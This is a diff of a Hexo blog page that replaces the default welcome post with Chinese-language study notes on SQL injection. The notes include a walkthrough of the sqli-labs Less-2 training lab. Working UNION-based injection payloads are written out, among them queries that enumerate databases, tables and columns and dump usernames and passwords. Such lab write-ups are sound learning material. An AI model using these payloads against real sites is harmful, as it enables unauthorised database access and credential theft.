@@ -10,7 +10,7 @@
 <link rel="shortcut icon" href="https://t1.picb.cc/uploads/2017/12/17/BnwnK.jpg">
 
 
-<title> 测试</title>
+<title> SQL注入笔记一</title>
 
 
 
@@ -162,7 +162,7 @@ margin-top: -80px;
 
     <!--title,date,tags-->
     <h2 id="hidden">
-        测试
+        SQL注入笔记一
     </h2>
 
     <section class="desec">
@@ -172,19 +172,22 @@ margin-top: -80px;
 
 
     <!-- content -->
-    <section id="postsec"><p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="测试2"><a href="#测试2" class="headerlink" title="测试2"></a>测试2</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+    <section id="postsec"><p>###基础<br>结构：MySQL—多个数据库—表—字段；<br>MySQL自带information_schema库;<br>其中包含三个重要的表<br>SCHEMATA—包含所有库名；TABELS—数据库中所有表；COLUMNS—标出库，表，字段对应关系；<br>而SQL注入比较常见的是通过上述表名获取数据库结构后再来获取敏感信息</p>
+<p>SQL注入分类：整型：即将传入参数作为整数查询。</p>
+<pre><code>select * from &lt;表&gt; where id = 1 </code></pre>
+<p>判断方式：</p>
+<pre><code>?id=1 and 1=1 #</code></pre>
+<p>不报错<br>    <code>?id =1 and 1=2 # </code><br>报错<br>如果为字符型 那么后台应该为<br><code>select * from &lt;表&gt; where id = &#39;1 and 1=1&#39;</code><br><code>select * from &lt;表&gt; where id = &#39;1 and 1=2&#39;</code><br>报错；<br>当然，也可通过报错信息来判断<br><img src="%5Cimages%5Cpasted-0.png%5C" alt="upload successful"><br>其中，左右两个’用来包裹错误信息，可以忽略<br>Limit 0,1意思为从第0个数据开始，每次只读取1个;<br>查看源代码，可以验证<br><img src="%5Cimages%5Cpasted-1.png%5C" alt="upload successful"></p>
+<p>字符型:通过<br><code>?id=1&#39; and &#39;1&#39;=&#39;1</code><br><code>?id=2’ and &#39;1&#39;=&#39;2</code><br>判断当然，如果不是白盒，我们很难一开始就知道到底是被’ “ 还是一堆奇奇怪怪的入)”包裹，所以fuzz吧。<br>#####实验<br>数字型: 环境sqlilab-less2</p>
+<p><img src="%5Cimages%5Cpasted-2.png%5C" alt="upload successful"></p>
+<p><img src="%5Cimages%5Cpasted-3.png%5C" alt="upload successful"><br>可知为三列，加带力度。</p>
+<p><img src="%5Cimages%5Cpasted-4.png%5C" alt="upload successful"></p>
+<p><img src="%5Cimages%5Cpasted-5.png%5C" alt="upload successful"><br>首先<br>通过Information_schema库下schemata表中 schema_name获得所有数据库名;如<br><code>?id=-1 union select 233,schema_name,666 from information_schema.schemata %23</code>其中233与666为占位，随便输。<br>但是现在只显示一行，可以使用group_concat()包裹列名;<br>之后来查询当前数据库中的表名<br>使用到information_schema 下tables表中table_name列；<br>又因为此列包含mysql中所有表名，故而，结尾限定<br><code>where table_schema = database()</code><br><code>?id=-1 union select 12,group_concat(table_name),233  from information_schema.tables where table_schema = database() %23</code></p>
+<p><img src="%5Cimages%5Cpasted-6.png%5C" alt="upload successful"><br>其中 users表一般会储藏敏感信息；<br>故而，继续查询其中的字段<br>仍旧通过information_schema库下，columns表column_name列<br>结尾限定table_schema = database() and table_name=’要查询的表名，这里是users’<br><code>?id=-1 union select 2,group_concat(column_name),233 from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; %23</code><br>(table_schema和table_name是columns表中另外两个列的名字，用于记录表中字段对应的表名和库名；  </p>
+<p><img src="%5Cimages%5Cpasted-7.png%5C" alt="upload successful"><br>然后 查询username ,password<br>注意这次查询实在当前数据库中的users表<br><code>?id=-1 union select 2,username,password from security.users #</code>  </p>
+<p><img src="%5Cimages%5Cpasted-8.png%5C" alt="upload successful"><br>只显示一行使用group_concat后混乱，所以使用concat_ws进行拼接<br><code>?id=-1 union select 2,group_concat(concat_ws(&#39;:&#39;,username,password)),2 from security.users #</code> </p>
+<p><img src="%5Cimages%5Cpasted-9.png%5C" alt="upload successful"></p>
+<p>当后面注释不可用的时候，试试–+ /* 或者通过闭合来查询；</p>
 
     </section>
 
